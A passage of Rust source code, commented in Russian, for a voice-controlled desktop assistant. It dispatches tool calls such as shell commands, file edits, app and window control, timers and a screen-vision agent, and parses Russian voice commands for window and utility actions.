                    // следующих шагов: иначе цепочка «зайди в проект и собери»
                    // не собирается — оболочка живёт только один вызов.
                    if let Some(dir) = parse_cd_target(&cmd)
                        && std::path::Path::new(&dir).is_dir()
                    {
                        let now = set_cwd(&dir);
                        println!("   рабочая директория: {now}");
                    }
                    let trimmed = out.trim();
                    if trimmed.is_empty() {
                        ToolOutcome::with_detail("Готово", "команда выполнена, вывода нет")
                    } else {
                        let detail: String = trimmed.chars().take(800).collect();
                        ToolOutcome::with_detail("Готово", detail)
                    }
                }
                Err(e) => {
                    ToolOutcome::fail_with_detail(format!("Не удалось: {}", short_err(&e, 160)), e)
                }
            }
        }

        ToolCall::OpenApp { name } => {
            println!("🔧 open_app: {name}");
            log(format!("🔧 open_app: {name}"));
            open_app_impl(&name)
        }

        ToolCall::QuitApp { name } => {
            println!("🔧 quit_app: {name}");
            log(format!("🔧 quit_app: {name}"));
            quit_app_impl(&name)
        }

        ToolCall::OpenUrl { url, browser } => {
            println!("🔧 open_url: {url} (браузер: {})", browser.as_deref().unwrap_or("по умолчанию"));
            log(format!("🔧 open_url: {url}"));
            // В браузер пускаем только http(s) с настоящим доменом: модель
            // иногда выдаёт мусор без схемы или localhost.
            let sanitized = sanitize_open_url(&url);
            if sanitized.is_empty() {
                ToolOutcome::fail(format!("Не похоже на адрес сайта: {url}"))
            } else {
                match browser.as_deref() {
                    // Названный браузер: на macOS это `open -a`. Если его нет —
                    // честно открываем в браузере по умолчанию и говорим об этом.
                    Some(b) => match open::with(&sanitized, b) {
                        Ok(_) => ToolOutcome::ok(format!("Открываю в {b}")),
                        Err(_) => match open::that(&sanitized) {
                            Ok(_) => ToolOutcome::ok(format!(
                                "Не нашёл {b}, открываю в браузере по умолчанию"
                            )),
                            Err(e) => ToolOutcome::fail(format!("Не удалось открыть {sanitized}: {e}")),
                        },
                    },
                    None => match open::that(&sanitized) {
                        Ok(_) => ToolOutcome::ok("Открываю"),
                        Err(e) => ToolOutcome::fail(format!("Не удалось открыть {sanitized}: {e}")),
                    },
                }
            }
        }

        ToolCall::OpenPath { path } => {
            println!("🔧 open_path: {path}");
            log(format!("🔧 open_path: {path}"));
            let p = resolve_path(&path);
            if !Path::new(&p).exists() {
                ToolOutcome::fail(format!("Путь не найден: {p}"))
            } else {
                match open::that(&p) {
                    Ok(_) => ToolOutcome::ok("Открываю папку"),
                    Err(e) => ToolOutcome::fail(format!("Не удалось открыть {p}: {e}")),
                }
            }
        }

        ToolCall::WebSearch { query } => {
            println!("🔎 web_search: {query}");
            log(format!("🔎 web_search: {query}"));
            match crate::web::search(&query, 5) {
                Ok(hits) if hits.is_empty() => ToolOutcome::fail("Ничего не нашлось в интернете"),
                Ok(hits) => {
                    // Тот же формат, что в обычном веб-флоу (build_summary_prompt):
                    // заголовки + сниппеты. Голые домены и заголовки модель
                    // превращает в выдумку по названию.
                    let count = hits.len();
                    let detail = crate::web::build_summary_prompt(&query, &hits)
                        .unwrap_or_else(|| "Поиск вернул пустой результат.".to_string());
                    ToolOutcome::with_detail(format!("Нашёл {count} результатов"), detail)
                }
                Err(e) => ToolOutcome::fail(format!("Поиск не удался: {e}")),
            }
        }

        ToolCall::SetTimer { seconds, label } => {
            println!("🔧 set_timer: {seconds}s");
            log(format!("🔧 set_timer: {seconds}s"));
            let human = humanize_seconds(seconds);
            let label_text = label.as_deref().unwrap_or("").to_string();
            let with_label = |base: String| {
                if label_text.is_empty() {
                    base
                } else {
                    format!("{base} — {label_text}")
                }
            };
            // Встроенный таймер: окно «Утилиты» тикает, по завершении Джарвис
            // звонит своим рингтоном (циклом) и говорит. Полный контроль у ассистента.
            crate::timers::start(
                events,
                audio_tx,
                &label_text,
                seconds,
                crate::timers::TimerKind::Timer,
            );
            ToolOutcome::ok(with_label(format!("Поставил таймер на {human}")))
        }

        ToolCall::TimerStop => {
            println!("🔧 timer_stop");
            log("🔧 timer_stop".to_string());
            match crate::timers::cancel(events, audio_tx, None, None) {
                Some(timer) => {
                    let left = humanize_seconds(timer.remaining_secs);
                    let what = if timer.kind == crate::timers::TimerKind::Alarm {
                        "будильник"
                    } else {
                        "таймер"
                    };
                    if timer.ringing {
                        ToolOutcome::ok(format!("Остановил {what} «{}»", timer.label))
                    } else {
                        ToolOutcome::ok(format!(
                            "Остановил {what} «{}» (осталось было {left})",
                            timer.label
                        ))
                    }
                }
                None => ToolOutcome::fail("Активных таймеров нет"),
            }
        }

        ToolCall::AlarmStop => {
            println!("🔧 alarm_stop");
            log("🔧 alarm_stop".to_string());
            match crate::timers::cancel(
                events,
                audio_tx,
                Some(crate::timers::TimerKind::Alarm),
                None,
            ) {
                Some(alarm) => ToolOutcome::ok(format!("Остановил будильник «{}»", alarm.label)),
                None => ToolOutcome::fail("Будильник не звонит"),
            }
        }

        ToolCall::OpenUtils { tab } => {
            let tab = tab.as_deref().map_or(UTILS_DEFAULT_TAB, UtilsTab::parse);
            println!("🔧 open_utils: {}", tab.as_str());
            log(format!("🔧 open_utils: {}", tab.as_str()));
            let _ = events.send(JarvisEvent::OpenUtils {
                tab: tab.as_str().to_string(),
            });
            ToolOutcome::ok(format!("Открыл утилиты: {}", tab.title()))
        }

        ToolCall::CloseUtils => {
            println!("🔧 close_utils");
            log("🔧 close_utils".to_string());
            let _ = events.send(JarvisEvent::CloseUtils);
            ToolOutcome::ok("Закрыл утилиты")
        }

        ToolCall::PlayReactorIntro => {
            println!("🔧 play_reactor_intro");
            log("🔧 play_reactor_intro".to_string());
            let _ = events.send(JarvisEvent::ReactorIntro);
            ToolOutcome::ok("Собираю реактор заново")
        }

        ToolCall::SetAlarm {
            seconds_from_now,
            label,
        } => {
            println!("🔧 set_alarm: {seconds_from_now}s");
            log(format!("🔧 set_alarm: {seconds_from_now}s"));
            let human = humanize_seconds(seconds_from_now);
            let label_text = label.as_deref().unwrap_or("").to_string();
            let with_label = |base: String| {
                if label_text.is_empty() {
                    base
                } else {
                    format!("{base} — {label_text}")
                }
            };
            // Будильник: отдельный рингтон, окно + голос + уведомление приложения.
            crate::timers::start(
                events,
                audio_tx,
                &label_text,
                seconds_from_now,
                crate::timers::TimerKind::Alarm,
            );
            ToolOutcome::ok(with_label(format!("Поставил будильник через {human}")))
        }

        ToolCall::SetVolume { percent } => {
            println!("🔧 set_volume: {percent}");
            log(format!("🔧 set_volume: {percent}"));
            if crate::platform::set_volume(percent) {
                ToolOutcome::ok(format!("Громкость {percent} процентов"))
            } else {
                ToolOutcome::fail("Не удалось изменить громкость")
            }
        }

        ToolCall::SetBrightness { percent } => {
            println!("🔧 set_brightness: {percent}");
            log(format!("🔧 set_brightness: {percent}"));
            if crate::platform::set_brightness(percent) {
                ToolOutcome::ok(format!("Яркость {percent} процентов"))
            } else {
                ToolOutcome::fail("Не удалось изменить яркость")
            }
        }

        ToolCall::Screenshot => {
            println!("🔧 screenshot");
            log("🔧 screenshot".into());
            match crate::platform::screenshot() {
                Some(p) => ToolOutcome::with_detail(format!("Скриншот сохранён в {p}"), p),
                None => ToolOutcome::fail("Не удалось сделать скриншот"),
            }
        }

        ToolCall::UiTask { task, success } => {
            println!("🔧 ui_task");
            log(format!("🤖 GUI-агент: задача «{}»", task.chars().take(100).collect::<String>()));
            // Идёт загрузка — ждём её здесь, а не возвращаем отказ: модель в
            // ответ на отказ начинала печатать и кликать вслепую.
            if let Err(why) = holo_gate(audio_tx) {
                ToolOutcome::fail_with_detail(
                    format!("Агент зрения недоступен: {why}"),
                    format!("{why}. Экран увидеть нельзя: не вводи текст и не кликай вслепую, сообщи пользователю причину."),
                )
            } else {
                // Единый контракт: основной цикл получает TaskResult с честным
                // состоянием; результат задачи финален, продолжение цепочки
                // не требуется (needs_next_step → false).
                match crate::holo::service::with_service(|h| {
                    h.run_task_full(&task.clone(), success.as_deref())
                }) {
                    Ok(result) => {
                        let evidence = result.evidence.last().cloned().unwrap_or_default();
                        let detail = format!(
                            "{} (шагов: {}, действий: {}){}",
                            result.summary,
                            result.steps,
                            result.total_actions,
                            if evidence.is_empty() {
                                String::new()
                            } else {
                                format!("\nПоследнее наблюдение: {}", evidence.chars().take(300).collect::<String>())
                            }
                        );
                        let _ = log(detail.clone());
                        if result.succeeded() {
                            clear_holo_failure();
                            ToolOutcome::with_detail(result.summary, detail)
                        } else {
                            ToolOutcome::fail_with_detail(result.summary, detail)
                        }
                    }
                    Err(e) => {
                        note_holo_failure();
                        ToolOutcome::fail(format!("GUI-агент недоступен: {e:#}"))
                    }
                }
            }
        }

        ToolCall::ScreenLook { question } => {
            println!("🔧 screen_look");
            log(format!("👀 screen_look: {}", question.chars().take(80).collect::<String>()));
            if let Err(why) = holo_gate(audio_tx) {
                ToolOutcome::fail_with_detail(
                    format!("Агент зрения недоступен: {why}"),
                    format!("{why}. Экран увидеть нельзя: не вводи текст и не кликай вслепую, сообщи пользователю причину."),
                )
            } else {
                match crate::holo::service::with_service(|h| h.look(&vision_question(&question))) {
                Ok(description) => {
                    let bounded: String = description.chars().take(900).collect();
                        ToolOutcome::with_detail(
                            "Экран разобран агентом зрения".to_string(),
                            format!("{question}\nОтвет агента зрения (по-английски, перескажи пользователю по-русски): {bounded}"),
                        )
                    }
                    Err(e) => ToolOutcome::fail(format!("Разбор экрана недоступен: {e:#}")),
                }
            }
        }

        ToolCall::LockScreen => {
            println!("🔧 lock_screen");
            log("🔧 lock_screen".into());
            if crate::platform::lock_screen() {
                ToolOutcome::ok("Экран заблокирован")
            } else {
                ToolOutcome::fail("Не удалось заблокировать экран")
            }
        }

        ToolCall::Sleep => {
            println!("🔧 sleep");
            log("🔧 sleep".into());
            if crate::platform::sleep_now() {
                ToolOutcome::ok("Усыпаю")
            } else {
                ToolOutcome::fail("Не удалось усыпить компьютер")
            }
        }

        ToolCall::Notify { title, body } => {
            println!("🔧 notify: {title}");
            log(format!("🔧 notify: {title}"));
            if crate::platform::notify(&title, &body) {
                ToolOutcome::ok(format!("{title}: {body}"))
            } else {
                ToolOutcome::fail("Не удалось показать уведомление")
            }
        }

        ToolCall::ClipboardRead => {
            println!("🔧 clipboard_read");
            log("🔧 clipboard_read".into());
            match crate::platform::clipboard_read() {
                Some(text) => {
                    let short: String = text.trim().chars().take(300).collect();
                    if short.is_empty() {
                        ToolOutcome::ok("Буфер пуст")
                    } else {
                        ToolOutcome::with_detail("Читаю буфер обмена", short)
                    }
                }
                None => ToolOutcome::fail("Не удалось прочитать буфер обмена"),
            }
        }

        ToolCall::ClipboardWrite { text } => {
            println!("🔧 clipboard_write");
            log("🔧 clipboard_write".to_string());
            if crate::platform::clipboard_write(&text) {
                ToolOutcome::ok("Скопировано")
            } else {
                ToolOutcome::fail("Не удалось записать в буфер обмена")
            }
        }

        ToolCall::AppleScript { script } => {
            println!("🔧 applescript");
            log(format!(
                "🔧 applescript: {}",
                &script[..script.len().min(80)]
            ));

            #[cfg(target_os = "macos")]
            {
                match Command::new("osascript").args(["-e", &script]).output() {
                    Ok(out) if out.status.success() => {
                        let stdout = String::from_utf8_lossy(&out.stdout).trim().to_string();
                        if stdout.is_empty() {
                            ToolOutcome::ok("Готово")
                        } else {
                            let short: String = stdout.chars().take(300).collect();
                            ToolOutcome::with_detail("Готово", short)
                        }
                    }
                    Ok(out) => {
                        let err = String::from_utf8_lossy(&out.stderr).trim().to_string();
                        ToolOutcome::fail(format!(
                            "AppleScript не выполнился: {}",
                            short_err(&err, 160)
                        ))
                    }
                    Err(e) => ToolOutcome::fail(format!("Ошибка: {e}")),
                }
            }

            #[cfg(not(target_os = "macos"))]
            {
                let _ = script;
                ToolOutcome::fail("AppleScript есть только на macOS")
            }
        }

        ToolCall::SystemInfo => {
            println!("🔧 system_info");
            log("🔧 system_info".into());
            ToolOutcome::ok(crate::platform::system_info())
        }

        ToolCall::DesktopInput { action } => {
            println!("🔧 desktop_input: {action:?}");
            log(format!("🔧 desktop_input: {action:?}"));
            if blind_input_blocked(&action) {
                return ToolOutcome::fail_with_detail(
                    "Не могу вводить вслепую: агент зрения недоступен",
                    "ЗАПРЕТ: агент зрения только что отказал, экран не виден. Ввод текста и клики вслепую заблокированы — сообщи пользователю причину текстом.",
                );
            }
            match crate::platform::desktop::execute(&action) {
                Ok(message) => ToolOutcome::with_detail(message, "Системе отправлена команда ввода; содержимое целевого окна отдельно не проверено"),
                Err(reason) => ToolOutcome::fail(reason),
            }
        }

        ToolCall::Wait { seconds } => {
            println!("⏳ wait: {seconds}s");
            log(format!("⏳ wait: {seconds}s"));
            std::thread::sleep(Duration::from_secs(seconds));
            ToolOutcome::ok(format!("Подождал {seconds} с"))
        }

        ToolCall::Window { action, app } => {
            println!(
                "🔧 window: {action} {}",
                app.as_deref().unwrap_or("(активное)")
            );
            log(format!(
                "🔧 window: {action} {}",
                app.as_deref().unwrap_or("(активное)")
            ));
            let text = crate::platform::window_control(&action, app.as_deref());
            // window_impl сигнализирует неудачу строкой — превращаем в статус.
            let lower = text.to_lowercase();
            let failed = [
                "не удалось",
                "не нашла",
                "не нашёл",
                "не найден",
                "ошибка",
                "не могу",
                "нет окон",
            ]
            .iter()
            .any(|p| lower.contains(p));
            if failed {
                ToolOutcome::fail(text)
            } else {
                ToolOutcome::ok(text)
            }
        }

        ToolCall::FileRead {
            path,
            offset,
            limit,
        } => {
            let p = resolve_path(&path);
            println!("🔧 file_read: {p}");
            log(format!("🔧 file_read: {p}"));
            match std::fs::read_to_string(&p) {
                Ok(content) => ToolOutcome::with_detail(
                    format!("Прочитал {p}"),
                    read_lines(&content, offset, limit),
                ),
                Err(e) => ToolOutcome::fail(format!("Не могу прочитать {p}: {e}")),
            }
        }

        ToolCall::FileWrite { path, content } => {
            let p = resolve_path(&path);
            println!("🔧 file_write: {p}");
            log(format!("🔧 file_write: {p}"));
            if let Some(parent) = Path::new(&p).parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            let existed = Path::new(&p).exists();
            match std::fs::write(&p, content) {
                Ok(_) => ToolOutcome::ok(if existed {
                    format!("Перезаписал {p}")
                } else {
                    format!("Записал {p}")
                }),
                Err(e) => ToolOutcome::fail(format!("Ошибка записи {p}: {e}")),
            }
        }

        ToolCall::FileAppend { path, content } => {
            let p = resolve_path(&path);
            println!("🔧 file_append: {p}");
            log(format!("🔧 file_append: {p}"));
            if let Some(parent) = Path::new(&p).parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            match append_to_file(&p, &content) {
                Ok(()) => ToolOutcome::ok(format!("Дописал в {p}")),
                Err(e) => ToolOutcome::fail(format!("Ошибка записи {p}: {e}")),
            }
        }

        ToolCall::FileEdit {
            path,
            old,
            new,
            all,
        } => {
            let p = resolve_path(&path);
            println!("🔧 file_edit: {p}");
            log(format!("🔧 file_edit: {p}"));
            match std::fs::read_to_string(&p) {
                Ok(content) => match apply_edit(&content, &old, &new, all) {
                    Ok((updated, count)) => match std::fs::write(&p, updated) {
                        Ok(_) => ToolOutcome::ok(format!("Изменил {p}: замен {count}")),
                        Err(e) => ToolOutcome::fail(format!("Ошибка записи {p}: {e}")),
                    },
                    Err(reason) => ToolOutcome::fail(reason),
                },
                Err(e) => ToolOutcome::fail(format!("Не могу прочитать {p}: {e}")),
            }
        }

        ToolCall::FileList { path } => {
            let p = resolve_path(&path);
            println!("🔧 file_list: {p}");
            log(format!("🔧 file_list: {p}"));
            match list_dir(&p) {
                Ok(list) => ToolOutcome::with_detail(format!("Содержимое {p}"), list),
                Err(e) => ToolOutcome::fail(format!("Ошибка: {e}")),
            }
        }

        ToolCall::FileSearch {
            query,
            path,
            context,
        } => {
            let root = resolve_path(path.as_deref().unwrap_or("."));
            println!("🔧 file_search: {query} в {root}");
            log(format!("🔧 file_search: {query} в {root}"));
            match search_in_path(&root, &query, context.unwrap_or(0)) {
                Ok(report) => {
                    if report.trim().is_empty() {
                        ToolOutcome::fail(format!("«{query}» не найдено в {root}"))
                    } else {
                        ToolOutcome::with_detail(format!("Нашёл «{query}» в {root}"), report)
                    }
                }
                Err(e) => ToolOutcome::fail(format!("Поиск не удался: {e}")),
            }
        }

        ToolCall::FileGlob { pattern, path } => {
            let root = resolve_path(path.as_deref().unwrap_or("."));
            println!("🔧 file_glob: {pattern} в {root}");
            log(format!("🔧 file_glob: {pattern} в {root}"));
            match glob_in_path(&root, &pattern) {
                Ok(report) => {
                    if report.trim().is_empty() {
                        ToolOutcome::fail(format!("По маске «{pattern}» ничего нет в {root}"))
                    } else {
                        ToolOutcome::with_detail(
                            format!("Нашёл по маске «{pattern}» в {root}"),
                            report,
                        )
                    }
                }
                Err(e) => ToolOutcome::fail(format!("Поиск не удался: {e}")),
            }
        }

        ToolCall::TaskAdd { text } => {
            println!("📝 task_add: {text}");
            log(format!("📝 task_add: {text}"));
            match crate::tasks::add(&text) {
                Ok(t) => ToolOutcome::ok(format!("Записал в задачник задачу {}: {}", t.id, t.text)),
                Err(e) => ToolOutcome::fail(format!("Не смог записать задачу: {e}")),
            }
        }

        ToolCall::TaskList => {
            println!("🗒 task_list");
            log("🗒 task_list".into());
            ToolOutcome::ok(crate::tasks::speak_list(5))
        }

        ToolCall::TaskDone { id } => {
            println!("✅ task_done: {id}");
            log(format!("✅ task_done: {id}"));
            match crate::tasks::set_done(id, true) {
                Some(t) => ToolOutcome::ok(format!("Закрыл задачу {}: {}", t.id, t.text)),
                None => ToolOutcome::fail(format!("Задачи {} нет", id)),
            }
        }

        ToolCall::TaskRemove { id } => {
            println!("🗑 task_remove: {id}");
            log(format!("🗑 task_remove: {id}"));
            match crate::tasks::remove(id) {
                Some(t) => ToolOutcome::ok(format!("Удалил задачу {}: {}", t.id, t.text)),
                None => ToolOutcome::fail(format!("Задачи {} нет", id)),
            }
        }

        // Реальную работу делает цикл агента в llm::run_action: он переспрашивает
        // модель с текстом задачи. Здесь только подтверждение для лога.
        ToolCall::TaskRun { id } => {
            let label = id
                .map(|n| format!("задача {n}"))
                .unwrap_or_else(|| "следующая задача".to_string());
            println!("▶️ task_run: {label}");
            log(format!("▶️ task_run: {label}"));
            ToolOutcome::ok(format!("Беру {label}"))
        }

        ToolCall::TaskOpen => {
            let path = crate::tasks::path();
            let p = path.to_string_lossy().to_string();
            println!("🗒 task_open: {p}");
            log(format!("🗒 task_open: {p}"));
            match open::that(&p) {
                Ok(_) => ToolOutcome::ok(format!("Открыл задачник: {p}")),
                Err(e) => ToolOutcome::fail(format!("Не удалось открыть задачник: {e}")),
            }
        }

        ToolCall::RunCommand { name, args } => {
            println!("🔧 run_command: {name}");
            log(format!("🔧 run_command: {name}"));
            crate::commands::run_command_tool(&name, &args, audio_tx, events)
        }

        ToolCall::SendMessage { to, text } => {
            println!("💬 send_message: {to}");
            log(format!("💬 send_message: {to}"));
            send_message_impl(&to, &text)
        }

        ToolCall::AddNote { title, body } => {
            println!("📝 add_note: {title}");
            log(format!("📝 add_note: {title}"));
            add_note_impl(&title, &body)
        }

        ToolCall::CreateEvent { title, date, time } => {
            println!("📅 create_event: {title} {date} {time}");
            log(format!("📅 create_event: {title} {date} {time}"));
            create_event_impl(&title, &date, &time)
        }

        ToolCall::MusicControl { action } => {
            println!("🎵 music_control: {action}");
            log(format!("🎵 music_control: {action}"));
            music_control_impl(&action)
        }
    };

    outcome
}

// =========================================================================
// Нативные приложения: Сообщения, Заметки, Календарь, Музыка
//
// Реализация — в platform: на macOS это iMessage, «Заметки», «Календарь»
// и «Музыка»/вкладки браузеров; на Linux и Windows — системные аналоги там,
// где они есть (музыка — playerctl/SMTC), и честные отказы там, где нет.
// =========================================================================

fn send_message_impl(to: &str, text: &str) -> ToolOutcome {
    match crate::platform::send_message(to, text) {
        Ok(speech) => ToolOutcome::ok(speech),
        Err(reason) => ToolOutcome::fail(reason),
    }
}

fn add_note_impl(title: &str, body: &str) -> ToolOutcome {
    match crate::platform::add_note(title, body) {
        Ok(speech) => ToolOutcome::ok(speech),
        Err(reason) => ToolOutcome::fail(reason),
    }
}

fn create_event_impl(title: &str, date: &str, time: &str) -> ToolOutcome {
    match crate::platform::create_event(title, date, time) {
        Ok(speech) => ToolOutcome::ok(speech),
        Err(reason) => ToolOutcome::fail(reason),
    }
}

fn music_control_impl(action: &str) -> ToolOutcome {
    match crate::platform::music_control(action) {
        Ok(speech) => ToolOutcome::ok(speech),
        Err(reason) => ToolOutcome::fail(reason),
    }
}

// =========================================================================
// Shell
// =========================================================================

fn run_shell(cmd: &str) -> Result<String, String> {
    // Реализация — в platform::shell: POSIX sh на Unix, cmd на Windows.
    crate::platform::shell::run(cmd, Duration::from_secs(30))
}

/// Санитизация адреса для браузера: добавляем схему и пускаем только
/// http/https с доменом (не localhost, не loopback, не IP без точки).
fn sanitize_open_url(url: &str) -> String {
    let t = url.trim();
    if t.is_empty() {
        return String::new();
    }
    let with_scheme = if t.starts_with("http://") || t.starts_with("https://") {
        t.to_string()
    } else {
        format!("https://{t}")
    };
    let host = with_scheme
        .strip_prefix("https://")
        .or_else(|| with_scheme.strip_prefix("http://"))
        .unwrap_or("")
        .split(['/', '?', '#'])
        .next()
        .unwrap_or("");
    let host_ok = host.contains('.')
        && !host.starts_with("localhost")
        && !host.starts_with("127.")
        && !host.starts_with("0.")
        && !host.starts_with("10.")
        && !host.starts_with("192.168.")
        && host != "[::1]";
    if host_ok { with_scheme } else { String::new() }
}

fn open_app_impl(name: &str) -> ToolOutcome {
    match crate::platform::app_open(name) {
        Ok(speech) => ToolOutcome::ok(speech),
        Err(reason) => ToolOutcome::fail(reason),
    }
}

/// Закрыть приложение целиком и подтвердить это исчезновением процесса.
/// «Запрос отправлен» — не успех: приложение с окном сохранения продолжает
/// работать, и пользователь должен услышать правду.
fn quit_app_impl(name: &str) -> ToolOutcome {
    let requested = name.trim();
    if requested.is_empty() {
        return ToolOutcome::fail("Не понял, какое приложение закрыть");
    }
    let canonical = crate::platform::app_lookup(requested)
        .unwrap_or_else(|| crate::platform::app_resolve(requested));
    let target = canonical.trim();
    if target.is_empty() {
        return ToolOutcome::fail(format!("Не понял, какое приложение закрыть: {requested}"));
    }
    if !crate::platform::app_running(target) && !crate::platform::app_running(requested) {
        return ToolOutcome::fail(format!("{target} и не запущен"));
    }
    if !crate::platform::app_quit(target) {
        return ToolOutcome::fail(format!("Не удалось отправить запрос на выход {target}"));
    }
    for _ in 0..15 {
        std::thread::sleep(Duration::from_millis(300));
        if !crate::platform::app_running(target) && !crate::platform::app_running(requested) {
            return ToolOutcome::ok(format!("Закрыл {target}"));
        }
    }
    ToolOutcome::fail(format!(
        "{target} не закрылся. Скорее всего, на экране окно сохранения — подтверди его"
    ))
}

/// Вкладка окна утилит Джарвиса. Фронтенд понимает ровно эти три имени,
/// поэтому всё, что придумала модель, приводится сюда.
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum UtilsTab {
    Timer,
    Stopwatch,
    Calendar,
}

/// Вкладка, которую показываем, если пользователь сказал просто «утилиты».
pub const UTILS_DEFAULT_TAB: UtilsTab = UtilsTab::Timer;

impl UtilsTab {
    pub fn parse(raw: &str) -> Self {
        let t = raw.to_lowercase();
        if t.contains("секундомер") || t.contains("stopwatch") {
            Self::Stopwatch
        } else if t.contains("календар") || t.contains("calendar") || t.contains("date") {
            Self::Calendar
        } else {
            Self::Timer
        }
    }

    pub fn as_str(self) -> &'static str {
        match self {
            Self::Timer => "timer",
            Self::Stopwatch => "stopwatch",
            Self::Calendar => "calendar",
        }
    }

    pub fn title(self) -> &'static str {
        match self {
            Self::Timer => "Таймер",
            Self::Stopwatch => "Секундомер",
            Self::Calendar => "Календарь",
        }
    }
}

/// «Открой утилиты», «покажи утилиты», «закрой утилиты» — окно Джарвиса.
/// `Some(true)` — закрыть, `Some(false)` — открыть.
///
/// Раньше эта фраза уезжала в LLM, а в каталоге инструментов был только
/// `close_utils`: модель честно выбирала единственный доступный инструмент
/// и закрывала окно вместо открытия.
pub fn utils_window_request(prompt: &str) -> Option<bool> {
    let t = prompt.to_lowercase();
    if !t.contains("утилит") {
        return None;
    }
    const CLOSE: &[&str] = &[
        "закрой",
        "закройте",
        "закрыть",
        "закрывай",
        "убери",
        "спрячь",
        "скрой",
        "выключи",
        "close",
        "hide",
    ];
    const OPEN: &[&str] = &[
        "открой",
        "откройте",
        "открыть",
        "открывай",
        "покажи",
        "покажите",
        "показать",
        "запусти",
        "запустить",
        "включи",
        "open",
        "show",
    ];
    if CLOSE.iter().any(|w| t.contains(w)) {
        return Some(true);
    }
    OPEN.iter().any(|w| t.contains(w)).then_some(false)
}

/// «Проиграй анимацию реактора», «покажи заставку», «собери реактор снова» —
/// просьба к интерфейсу: движок не трогает систему, а шлёт событие в UI.
///
/// Быстрый путь нужен потому, что без него фраза уезжала в LLM, где ей не
/// было места в каталоге инструментов — и ответ оставался только словами.
pub fn reactor_intro_request(prompt: &str) -> bool {
    let t = prompt.to_lowercase();
    const VERBS: &[&str] = &[
        "проиграй",
        "проиграть",
        "проигрывай",
        "повтори",
        "повторить",
        "покажи",
        "показать",
        "запусти",
        "запустить",
        "включи",
        "сыграй",
        "play",
        "replay",
        "show",
    ];
    const OBJECTS: &[&str] = &["анимаци", "застав", "сборк", "интро"];
    VERBS.iter().any(|v| t.contains(v)) && OBJECTS.iter().any(|o| t.contains(o))
}

/// Быстрый путь утилит: «открой календарь», «секундомер», «поставь таймер»
/// без цифр — открываем окно утилит Джарвиса (не Calendar.app и не LLM).
/// Просьбы с цифрами («таймер на 5 минут») — None: это set_timer.
pub fn utils_tab_for_prompt(prompt: &str) -> Option<&'static str> {
    let t = prompt.to_lowercase();
    if t.contains("секундомер") {
        return Some("stopwatch");
    }
    if t.contains("календар") {
        return Some("calendar");
    }
    if t.contains("таймер") {
        // «таймер на двадцать секунд / на 5 минут / на полчаса» — это
        // set_timer, а не окно: числа-слова STT пишет словами, цифры тоже.
        let has_digit = t.chars().any(|c| c.is_ascii_digit());
        let has_unit = ["секунд", "минут", "час", "полминуты", "полчаса"]
            .iter()
            .any(|w| t.contains(w));
        let has_number_word = [
            "двадцат",
            "тридцат",
            "сорок",
            "пятнадцат",
            "десят",
            "пят",
            "шест",
            "сем",
            "восем",
            "девят",
            "двенадцат",
            "тринадцат",
            "четырнадцат",
            "сто ",
        ]
        .iter()
        .any(|w| t.contains(w));
        if has_digit || has_unit || has_number_word {
            return None;
        }
        return Some("timer");
    }
    None
}

/// Быстрый путь команд окна: «сверни окно сафари», «разверни окно зума»,
/// «закрой окно джарвиса», «сверни приложение рио» — применяем сразу, без
/// лотереи tool-вызовов модели (2B то вызывает не тот инструмент, то пишет
/// «Сafari» кириллицей, то копирует пример из промпта и подставляет чужое
/// имя). Возвращает (действие, приложение) или None — пусть решает LLM.
///
/// Закрытие окна и выход приложения здесь строго различаются: «закрой окно
/// сафари» — window close, «закрой приложение сафари» — не окно, а quit_app.
pub fn window_request_from_prompt(prompt: &str) -> Option<(String, Option<String>)> {
    let t = prompt.to_lowercase();
    if t.chars().any(|c| c.is_ascii_digit()) {
        return None;
    }
    let words: Vec<String> = t
        .split_whitespace()
        .map(|w| w.trim_matches(|c: char| !c.is_alphanumeric()).to_string())
        .filter(|w| !w.is_empty())
        .collect();
    if words.is_empty() {
        return None;
    }

    let window_marker = words
        .iter()
        .position(|w| w.starts_with("окн") || w == "окон" || w.starts_with("окошк"));
    let app_marker = words
        .iter()
        .position(|w| w.starts_with("приложен") || w.starts_with("программ"));

    const STOP: &[&str] = &[
        "пожалуйста",
        "пожалуйста,",
        "сейчас",
        "быстро",
        "джарвис",
        "сэр",
        "плиз",
        "мне",
        "на",
        "в",
        "во",
        "передний",
        "переднем",
        "план",
        "вперед",
        "вперёд",
        "наверх",
        "фокус",
        "открыты",
        "открыто",
        "открытых",
        "открыт",
        "весь",
        "все",
        "полный",
        "полном",
        "экран",
        "режим",
        "окно",
        "окошко",
        "окна",
        "окон",
        "окнами",
        "окнах",
        "окошек",
        "приложение",
        "приложения",
        "приложению",
        "приложением",
        "программа",
        "программу",
        "программы",
        "программой",
    ];
    const VERBS: &[&str] = &[
        "сверни",
        "сверните",
        "свернуть",
        "минимизируй",
        "минимизировать",
        "разверни",
        "разверните",
        "развернуть",
        "максимизируй",
        "максимизировать",
        "восстанови",
        "восстановить",
        "верни",
        "верните",
        "вернуть",
        "закрой",
        "закройте",
        "закрыть",
        "закрывай",
        "переключись",
        "переключи",
        "переключите",
        "перейди",
        "перейти",
        "активируй",
        "активировать",
        "выведи",
        "вывести",
        "покажи",
        "показать",
        "спрячь",
        "скрой",
        "убери",
        "растяни",
    ];
    let target_words = |slice: &[String]| -> Vec<String> {
        slice
            .iter()
            .filter(|w| !STOP.contains(&w.as_str()) && !VERBS.contains(&w.as_str()))
            .cloned()
            .collect()
    };

    let has = |set: &[&str]| words.iter().any(|w| set.contains(&w.as_str()));
    let joined = words.join(" ");
    let focus_verb = has(&[
        "переключись",
        "переключи",
        "переключите",
        "перейди",
        "перейти",
        "активируй",
        "активировать",
        "выведи",
        "вывести",
    ]);

    // «Переключись на телеграм» — фокус на приложении, хотя слова «окно» нет.
    if window_marker.is_none() && app_marker.is_none() {
        if !focus_verb {
            return None;
        }
        let focus_target = target_words(&words);
        if focus_target.is_empty() {
            return None;
        }
        return Some(("focus".to_string(), Some(focus_target.join(" "))));
    }

    // Маркер, после которого обычно идёт имя. При «активное окно» имя стоит
    // перед маркером, поэтому ниже смотрим и назад.
    let marker = window_marker.or(app_marker)?;
    let mut target = target_words(&words[marker..]);
    if target.is_empty() {
        // «сверни активное окно», «сверни телеграма окно» — имя перед маркером.
        target = target_words(&words[..marker]);
    }

    let active = words.iter().any(|w| {
        matches!(
            w.as_str(),
            "активное" | "активную" | "активный" | "текущее" | "текущий" | "это"
        )
    });
    let target = if active {
        Some("активное".to_string())
    } else if target.is_empty() {
        None
    } else {
        Some(target.join(" "))
    };

